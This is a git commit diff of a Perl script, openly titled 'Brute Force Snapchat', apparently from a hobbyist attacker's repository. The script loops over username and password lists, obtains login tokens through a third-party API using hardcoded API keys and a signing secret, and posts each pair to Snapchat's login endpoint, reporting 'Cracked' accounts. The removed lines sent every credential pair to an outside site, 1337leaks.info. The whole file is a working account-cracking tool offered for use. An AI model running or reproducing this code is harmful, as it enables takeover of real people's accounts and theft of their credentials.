1aec949f38247ef95a09b8857f4af9a1425d32dc
1337r00t <u9cc85@gmail.com>
2017-09-19 08:47:19 +0300

    [Brute Force Snapchat] - BF Using API-Casper

--- brute.pl
+++ brute.pl
@@ -1,50 +1,102 @@
-use LWP::UserAgent ;
+##########################################
+use LWP::UserAgent; # ppm install LWP::UserAgent
+use JSON::WebToken; # ppm install JSON::WebToken
+##########################################
 system('cls');
 print qq(
 ################################
-#
-# Coded By 1337r00t
-#
-# Instagram : @1337r00t
-#
-# Twitter : @_1337r00t
-#
-################################\n);
+#   [Casper API] BF SC API     #
+################################
+#     Coded By 1337r00t        #
+################################
+#                              #
+#   Instagram : 1337r00t       #
+#                              #
+#    Twitter : _1337r00t       #
+#                              #
+################################
+Enter [CTRL+C] For Exit :0\n);
 print qq(
 Enter Usernames File :
 > );
 $usernames=<STDIN>;
 chomp($usernames);
-open (USERFILE, "<$usernames") || die "[-] Can't Found The List Of Usernames !";
+open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
 @USERS = <USERFILE>;
 close USERFILE;
-
 print qq(
 Enter Passwords File :
 > );
 $passwords=<STDIN>;
 chomp($passwords);
-open (PASSFILE, "<$passwords") || die "[-] Can't Found The List Of Passwords !";
+open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
 @PASSS = <PASSFILE>;
 close PASSFILE;
 system('cls');
-print "Cracking Now !..\n";
+print '
+    _   _____  _____   _____    ____    ___       ___     _____   
+   /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
+ u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
+  \| |/ ___) | ___) | u// /\   |  _ < | \// |,-.| \// |,-./| |\   
+   |_| |____/ |____/   /_/ U   |_| \_\ \___/(_/  \___/(_/u |_|U   
+ _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
+(__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
+';
+print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
 ######################
 foreach $username (@USERS) {
 chomp $username;
-foreach $password (@PASSS) {
-chomp $password;
-	$ua = LWP::UserAgent->new();
-	$request = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/?username=$username&password=$password");
-	$response = $ua->request($request);
-	$output = $response->content();
-	if ($response->content=~ /cracked/) {
-		print "$output\n";
-		exit;
+	foreach $password (@PASSS) {
+	chomp $password;
+		$jwt = JSON::WebToken->encode({
+			sub => 'Joe',
+			username => $username,
+			password => $password,
+			iat => time,
+		}, 'f3cdf4bbf206f5d572c6db13757c06fe');
+		$casper = LWP::UserAgent->new();
+		$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
+		$casper->default_header('Content-Type' => "application/x-www-form-urlencoded; charset=UTF-8");
+		$casper->default_header('User-Agent' => "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)");
+		$casper->default_header('Connection' => "Keep-Alive");
+		$requests = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
+		if ($requests->content=~ /"code":200/) {
+			$snapchat = LWP::UserAgent->new();
+			$snapchat->default_header('X-Snapchat-Client-Token' => $requests->content=~ /"X-Snapchat-Client-Token":"(.+?)"/ );
+			$snapchat->default_header('User-Agent' => $requests->content=~ /"User-Agent":"(.+?)"/ );
+			$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $requests->content=~ /"X-Snapchat-Client-Auth-Token":"(.+?)"/ );
+			$snapchat->default_header('Accept-Language' => "en-NZ;q=1");
+			$response = $snapchat->post('https://auth.snapchat.com/scauth/login',
+				{ 
+				password => $password,
+				timestamp => $requests->content=~ /"timestamp":"(.*?)"/,
+				username => $username,
+				req_token => $requests->content=~ /"req_token":"(.*?)"/
+				}
+				);
+			if ($response->content=~ /"logged":true,/) {
+				print "Cracked -> ($username:$password)\n";
+				sleep(3);
+			}
+			else
+			{
+				if ($response->content=~ /not the right password/) {
+					print "Failed -> ($username:$password)\n";
+				}
+				else
+				{
+					if ($response->content=~ /find an account with that username./) {
+						print "Username Not Found -> ($username)\n";
+					}
+					else
+					{
+						print "Sorry, Blocked IP for many Requests\n";
+					}
+				}
+			}
+		}
+		else {
+			print "JWT [Casper API] Error";
+		}
 	}
-	else
-	{
-		print "$output\n";
-	}
-}
 }
